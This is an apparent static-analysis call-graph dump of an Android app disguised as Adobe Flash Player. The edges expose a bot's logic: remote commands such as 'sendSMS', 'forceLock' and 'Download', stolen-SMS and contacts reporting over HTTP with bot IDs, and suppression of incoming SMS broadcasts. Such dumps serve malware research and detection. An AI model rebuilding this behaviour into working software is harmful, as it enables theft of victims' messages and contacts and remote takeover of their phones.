VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("faceLock") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeUtil: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: void onDestroy()>
VIRTUAL edge: $r5 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.io.FileInputStream openFileInput(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <android.content.ContextWrapper: java.io.FileInputStream openFileInput(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r12) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("sendSMS") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.AdobeZCore: void <init>()> ==> <android.app.Service: void <init>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("package", $r5, $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int length()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r15.<java.lang.StringBuilder: void <init>(java.lang.String)>($r9) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
CLINIT edge: staticinvoke <android.view.WindowManager$LayoutParams: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.view.WindowManager$LayoutParams: void <clinit>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r5, $r17, $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r5 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
STATIC edge: $r11 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("keySmsGate[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r30 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("#", "W") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "contacts.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)>
VIRTUAL edge: $r4 = virtualinvoke $r2.<android.content.Intent: java.lang.String getAction()>() in <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.Intent: java.lang.String getAction()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r15.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r16) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r15) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=processes&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/AdobeZCore;") in <com.adobe.flashplayer_.AdobeZCore: void onDestroy()> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r21 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("in", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: void setResultData(java.lang.String)>(null) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void setResultData(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r6 = virtualinvoke $r4.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r13 = virtualinvoke $r15.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("?a=0&b=") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(long)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r12) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
CLINIT edge: staticinvoke <android.app.Activity: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.app.Activity: void <clinit>()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=stealed_sms&i=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r2.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/AdobeFlashCore;") in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
SPECIAL edge: $r18 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
CLINIT edge: staticinvoke <android.provider.CallLog$Calls: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.provider.CallLog$Calls: void <clinit>()>
SPECIAL edge: specialinvoke $r52.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashURL: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("forceLock") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer.Certificate: void <init>()>() in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate: void <init>()>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: $r7 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("us") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>(r25, "in.txt", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r3 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.Object getSystemService(java.lang.String)>("phone") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.content.ContextWrapper: java.lang.Object getSystemService(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)>
SPECIAL edge: specialinvoke $r15.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("Download") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: android.content.Intent getIntent()>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("forceZ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: $r6 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("Phone: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void abortBroadcast()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void abortBroadcast()>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)>
